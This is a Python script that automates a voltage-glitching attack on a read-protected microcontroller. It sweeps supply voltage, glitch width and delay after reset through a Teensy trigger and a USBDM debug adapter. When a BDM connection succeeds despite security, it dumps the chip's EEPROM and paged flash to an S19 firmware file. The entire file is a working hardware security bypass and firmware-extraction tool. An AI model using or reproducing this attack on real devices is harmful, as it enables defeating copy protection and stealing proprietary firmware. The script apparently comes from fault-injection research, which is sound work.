#!/usr/bin/env python3
"""
Automated RESET-mode BDM voltage + width + delay sweep.
Glitches during boot security evaluation, then probes memory.

Each attempt: reset target -> Teensy fires glitch on RESET rising edge ->
wait for boot -> Connect -> ReadMemory(0xFFFE) -> check for real data.

Validates hits by reading multiple addresses and checking against known values.

Usage:
    python -u auto_bdm_reset_sweep.py --teensy COM11 --gpib 5
"""

import serial
import time
import csv
import argparse
from datetime import datetime
from pymeasure.instruments.keysight import KeysightE3631A
from usbdm import USBDM, BDM_RC_OK, USBDMError

# Safety limits
MAX_VOLTAGE = 2.500
MIN_VOLTAGE = 1.500  # target board operates as low as 1.545V
CLOCK_VOLTAGE = 2.000

# Known value for test board reset vector
EXPECTED_RESET_VECTOR = 0xC029


def setup_supply(gpib_addr=5):
    supply = KeysightE3631A(f"GPIB::{gpib_addr}")
    supply.ch_1.current_limit = 0.01
    supply.ch_2.current_limit = 0.1
    supply.ch_2.voltage_setpoint = CLOCK_VOLTAGE
    supply.output_enabled = True
    time.sleep(0.5)
    print(f"Supply connected. Ch2 (clock) = {supply.ch_2.voltage:.3f}V")
    return supply


def set_core_voltage(supply, voltage):
    if voltage > MAX_VOLTAGE:
        raise ValueError(f"Voltage {voltage}V exceeds max {MAX_VOLTAGE}V!")
    if voltage < MIN_VOLTAGE:
        raise ValueError(f"Voltage {voltage}V below min {MIN_VOLTAGE}V!")
    supply.ch_1.voltage_setpoint = voltage
    time.sleep(0.3)
    actual = supply.ch_1.voltage
    print(f"  Core voltage set: {voltage:.3f}V, measured: {actual:.3f}V")
    return actual


def teensy_cmd(ser, cmd):
    ser.reset_input_buffer()
    ser.write(f"{cmd}\n".encode())
    ser.flush()
    time.sleep(0.05)
    resp = ""
    deadline = time.time() + 0.3
    while time.time() < deadline:
        if ser.in_waiting:
            resp += ser.read(ser.in_waiting).decode(errors='replace')
            time.sleep(0.01)
        else:
            time.sleep(0.01)
    return resp.strip()


def reset_glitch_and_check(bdm, teensy, delay_ns, width_ns):
    """
    RESET-mode glitch attempt with Connect() as primary detection.
    1. Arm Teensy in RESET mode (fires on RESET rising edge)
    2. USBDM asserts+releases RESET
    3. Teensy fires glitch at delay_ns after rising edge
    4. Wait for boot, call Connect()
    5. Connect() rc == BDM_RC_OK → security bypassed
    Returns connect_rc, or None on USBDM error.
    """
    # Arm Teensy: disarm, set params, arm RESET mode
    teensy_cmd(teensy, "X")
    teensy_cmd(teensy, f"D{delay_ns}")
    teensy_cmd(teensy, f"W{width_ns}")
    teensy_cmd(teensy, "R")

    # USBDM triggers RESET (assert + release)
    try:
        bdm.target_reset()
    except USBDMError:
        return None

    # Wait for target to boot + security evaluation
    time.sleep(0.08)

    # Drain Teensy (should have R<delay>,<width> confirmation)
    if teensy.in_waiting:
        teensy.read(teensy.in_waiting)

    # Connect — this is the detection:
    # BDM_RC_OK (0) = security bypassed (ENBDM succeeded)
    # BDM_RC_BDM_EN_FAILED (18) = still secured
    # Other = error
    rc = bdm.connect()
    return rc


def validate_hit(bdm, probe_addr, expected_val=None):
    """Read multiple addresses to confirm chip is truly unsecured."""
    results = {}
    test_addrs = [0xFFFE, 0xFFFC, 0xC000, 0xC002, 0x4000]
    for addr in test_addrs:
        try:
            val = bdm.read_word(addr)
            results[addr] = val
        except:
            results[addr] = None

    # Check: multiple non-zero non-FFFF reads = likely real data
    real_reads = sum(1 for v in results.values()
                     if v is not None and v != 0x0000 and v != 0xFFFF)

    return results, real_reads >= 3


def dump_firmware(bdm, teensy, delay_ns, width_ns, output_prefix="firmware"):
    """Dump all flash memory after a successful security bypass.
    Re-glitches if needed (chip re-secures after reset)."""
    from datetime import datetime

    # Fixed ranges (no PPAGE needed)
    # Paged ranges require writing PPAGE register at $0030
    PPAGE_REG = 0x0030
    mem_ranges = [
        (0x0400, 0x07FF, "EEPROM", None),
        (0x4000, 0x7FFF, "Flash (page 0x3E, fixed)", None),
        (0x8000, 0xBFFF, "Flash (page 0x3C, paged)", 0x3C),
        (0x8000, 0xBFFF, "Flash (page 0x3D, paged)", 0x3D),
        (0xC000, 0xFFFF, "Flash (page 0x3F, fixed)", None),
    ]

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    s19_path = f"{output_prefix}_{ts}.s19"
    firmware = {}  # addr -> byte

    print(f"\n{'='*60}")
    print(f"DUMPING FIRMWARE -> {s19_path}")
    print(f"{'='*60}")

    for start, end, name, ppage in mem_ranges:
        print(f"\n  Reading {name} (0x{start:04X}-0x{end:04X})...")

        # Set PPAGE register for banked flash pages
        if ppage is not None:
            try:
                bdm.write_memory(PPAGE_REG, bytes([ppage]))
                print(f"    PPAGE set to 0x{ppage:02X}")
            except Exception as e:
                print(f"    FAILED to set PPAGE: {e}")
                continue

        # For paged regions, store at the linear address
        # Page 0x3C -> 0x08000-0x0BFFF, Page 0x3D -> 0x0C000-0x0FFFF (linear)
        # But for S19, use paged linear: page*0x4000 for unique addressing
        if ppage == 0x3C:
            addr_offset = 0x08000 - 0x8000  # store at 0x08000
        elif ppage == 0x3D:
            addr_offset = 0x0C000 - 0x8000  # store at 0x0C000
        else:
            addr_offset = 0

        addr = start
        retries = 0
        max_retries = 50

        while addr <= end:
            try:
                data = bdm.read_memory(addr, min(32, end - addr + 1))
                for i, b in enumerate(data):
                    firmware[addr + addr_offset + i] = b
                addr += len(data)
                retries = 0

                if (addr - start) % 256 == 0:
                    pct = (addr - start) / (end - start + 1) * 100
                    print(f"    0x{addr:04X} ({pct:.0f}%)")

            except Exception:
                retries += 1
                if retries >= max_retries:
                    print(f"    FAILED at 0x{addr:04X} after {max_retries} retries")
                    break

                if retries % 10 == 0:
                    print(f"    Re-glitching at 0x{addr:04X} (retry {retries})...")
                    # Re-glitch to restore unsecured state
                    teensy_cmd(teensy, "X")
                    teensy_cmd(teensy, f"D{delay_ns}")
                    teensy_cmd(teensy, f"W{width_ns}")
                    teensy_cmd(teensy, "R")
                    try:
                        bdm.target_reset()
                        import time
                        time.sleep(0.08)
                        if teensy.in_waiting:
                            teensy.read(teensy.in_waiting)
                        rc = bdm.connect()
                        if rc != 0:
                            print(f"    Connect rc={rc}, retrying glitch...")
                    except:
                        pass

    # Write S19 file (S1 for 16-bit addr, S2 for 24-bit addr)
    if firmware:
        with open(s19_path, 'w') as f:
            addrs = sorted(firmware.keys())
            i = 0
            while i < len(addrs):
                rec_start = addrs[i]
                rec_data = []
                while i < len(addrs) and addrs[i] == rec_start + len(rec_data) and len(rec_data) < 32:
                    rec_data.append(firmware[addrs[i]])
                    i += 1

                if rec_start > 0xFFFF:
                    # S2 record: 3 addr bytes + data + 1 checksum
                    count = len(rec_data) + 4
                    line = f"S2{count:02X}{rec_start:06X}"
                    checksum = count + (rec_start >> 16) + ((rec_start >> 8) & 0xFF) + (rec_start & 0xFF)
                else:
                    # S1 record: 2 addr bytes + data + 1 checksum
                    count = len(rec_data) + 3
                    line = f"S1{count:02X}{rec_start:04X}"
                    checksum = count + (rec_start >> 8) + (rec_start & 0xFF)

                for b in rec_data:
                    line += f"{b:02X}"
                    checksum += b
                checksum = (~checksum) & 0xFF
                line += f"{checksum:02X}"
                f.write(line + "\n")

            # S9 end record
            f.write("S9030000FC\n")

        total = len(firmware)
        print(f"\n  Wrote {total} bytes to {s19_path}")
        return s19_path
    else:
        print("\n  No data captured!")
        return None


def sweep_reset_mode(bdm, teensy, writer, voltage_mv, width_ns,
                     delay_start, delay_end, delay_step, tries, probe_addr,
                     expected_val=None):
    """Sweep delay range using RESET-mode glitching.
    Uses Connect() return code as primary hit detection."""
    hits = []
    total = 0
    errors = 0
    misses = 0
    num_steps = (delay_end - delay_start) // delay_step

    for step_idx, delay_ns in enumerate(range(delay_start, delay_end, delay_step)):
        for attempt in range(tries):
            total += 1
            rc = reset_glitch_and_check(bdm, teensy, delay_ns, width_ns)

            if rc is None:
                errors += 1
                if errors >= 5:
                    teensy_cmd(teensy, "X")
                    try:
                        bdm.target_reset()
                        time.sleep(0.2)
                        bdm.connect()
                    except:
                        pass
                    errors = 0
                continue

            errors = 0

            if rc == BDM_RC_OK:
                # Connect succeeded — security bypassed!
                # Read probe address to confirm
                val = 0
                try:
                    val = bdm.read_word(probe_addr)
                except:
                    val = 0xDEAD  # read failed but Connect() said unsecured

                # Validate with multiple reads
                validation, confirmed = validate_hit(bdm, probe_addr)

                matched = (expected_val is not None and val == expected_val)
                status = "MATCH" if matched else ("confirmed" if confirmed else "unsecured")

                print(f"\n  *** {'RESET VECTOR MATCH' if matched else 'CONNECT OK'} *** "
                      f"delay={delay_ns}ns W={width_ns}ns "
                      f"0xFFFE=0x{val:04X} [{status}]")
                print(f"      Validation: "
                      + " ".join(f"0x{a:04X}=0x{v:04X}"
                                 for a, v in sorted(validation.items())
                                 if v is not None))

                hits.append((delay_ns, val, True))
                writer.writerow([
                    datetime.now().isoformat(), voltage_mv, width_ns,
                    delay_ns, attempt, f"0x{probe_addr:04X}",
                    f"0x{val:04X}", f"rc={rc}", status,
                    "|".join(f"0x{a:04X}=0x{v:04X}"
                             for a, v in sorted(validation.items())
                             if v is not None)
                ])

                # Attempt firmware dump on any confirmed hit
                if confirmed or matched:
                    s19 = dump_firmware(bdm, teensy, delay_ns, width_ns)
                    if s19:
                        print(f"\n  *** FIRMWARE SAVED: {s19} ***")
                    return hits
            else:
                misses += 1

        if step_idx % 10 == 0:
            print(f"  [{step_idx}/{num_steps}] delay={delay_ns}ns: "
                  f"{len(hits)} hits, {misses} misses, {errors} errs")

    return hits


def main():
    parser = argparse.ArgumentParser(description="RESET-mode BDM voltage sweep")
    parser.add_argument("--teensy", default="COM11")
    parser.add_argument("--gpib", type=int, default=5)
    parser.add_argument("--v-start", type=float, default=1.635)
    parser.add_argument("--v-end", type=float, default=1.660)
    parser.add_argument("--v-step", type=float, default=0.005)
    parser.add_argument("--width-list", default="100,150,200",
                        help="Glitch widths in ns")
    parser.add_argument("--delay-start", type=int, default=0,
                        help="Delay from RESET rising edge (ns)")
    parser.add_argument("--delay-end", type=int, default=200000,
                        help="Delay sweep end (ns)")
    parser.add_argument("--delay-step", type=int, default=1000,
                        help="Delay step (ns)")
    parser.add_argument("--tries", type=int, default=3)
    parser.add_argument("--probe", type=lambda x: int(x, 0), default=0xFFFE)
    parser.add_argument("--expected", type=lambda x: int(x, 0), default=None,
                        help="Expected value at probe address (e.g. 0xC029 for test board reset vector)")
    parser.add_argument("--output", default=None)
    args = parser.parse_args()

    if args.output is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        args.output = f"bdm_reset_sweep_{ts}.csv"

    width_list = [int(w) for w in args.width_list.split(",")]

    if args.v_end > MAX_VOLTAGE or args.v_start < MIN_VOLTAGE:
        print("ERROR: voltage out of safety range")
        return

    voltages = []
    v = args.v_start
    while v <= args.v_end + 0.0001:
        voltages.append(round(v, 3))
        v += args.v_step

    print("Connecting to power supply...")
    supply = setup_supply(args.gpib)

    print(f"Opening Teensy on {args.teensy}...")
    teensy = serial.Serial(args.teensy, 115200, timeout=0.5)
    time.sleep(2)
    teensy.reset_input_buffer()

    print("Connecting to USBDM...")
    bdm = USBDM()
    bdm.open()

    logfile = open(args.output, "w", newline="")
    writer = csv.writer(logfile)
    writer.writerow(["timestamp", "voltage_mv", "width_ns", "delay_ns",
                     "attempt", "probe_addr", "probe_val", "bdmsts",
                     "status", "validation"])

    num_steps = (args.delay_end - args.delay_start) // args.delay_step
    est_per_attempt = 0.15  # ~150ms per RESET attempt
    total_attempts = len(voltages) * len(width_list) * num_steps * args.tries
    est_minutes = total_attempts * est_per_attempt / 60
    print(f"\nSweep: {len(voltages)} voltages x {len(width_list)} widths x "
          f"{num_steps} steps x {args.tries} tries = {total_attempts} attempts")
    print(f"Estimated time: {est_minutes:.0f} minutes")
    print(f"Delay: {args.delay_start}-{args.delay_end}ns, step {args.delay_step}ns")
    print(f"Widths: {width_list}ns\n")

    all_results = {}

    try:
        for voltage in voltages:
            voltage_mv = int(round(voltage * 1000))
            print(f"\n{'='*60}")
            print(f"VOLTAGE: {voltage:.3f}V ({voltage_mv}mV)")
            print(f"{'='*60}")

            actual = set_core_voltage(supply, voltage)
            time.sleep(1)

            all_results[voltage_mv] = {}

            for width_ns in width_list:
                print(f"\n  --- Width: {width_ns}ns ---")
                hits = sweep_reset_mode(
                    bdm, teensy, writer, voltage_mv, width_ns,
                    args.delay_start, args.delay_end, args.delay_step,
                    args.tries, args.probe, args.expected)
                logfile.flush()

                all_results[voltage_mv][width_ns] = {"total": len(hits)}
                print(f"  Width {width_ns}ns: {len(hits)} hits")

                # Check if any hit matched expected value
                if args.expected and any(v == args.expected for _, v, _ in hits):
                    print(f"\n  *** FOUND WORKING PARAMETERS: "
                          f"{voltage_mv}mV W={width_ns}ns ***")
                    raise StopIteration()

            total = sum(r["total"] for r in all_results[voltage_mv].values())
            print(f"\n  {voltage_mv}mV: {total} hits")

        # Final comparison
        print(f"\n{'='*60}")
        print("FINAL COMPARISON")
        print(f"{'='*60}")
        header = f"{'mV':>6}"
        for w in width_list:
            header += f" {'W'+str(w):>10}"
        header += f" {'Total':>8} {'Conf':>6}"
        print(header)
        print("-" * len(header))
        for voltage_mv in sorted(all_results.keys()):
            row = f"{voltage_mv:>6}"
            total = 0
            for w in width_list:
                r = all_results[voltage_mv].get(w, {"total": 0})
                total += r["total"]
                row += f" {r['total']:>8}"
            row += f" {total:>8}"
            print(row)

    except StopIteration:
        print("\nSweep completed early — match found!")
    except KeyboardInterrupt:
        print("\nSweep interrupted.")
    finally:
        teensy_cmd(teensy, "X")
        print("\nReturning to 1.650V...")
        supply.ch_1.voltage_setpoint = 1.650
        logfile.close()
        teensy.close()
        bdm.close()
        print(f"Results saved to {args.output}")


if __name__ == "__main__":
    main()
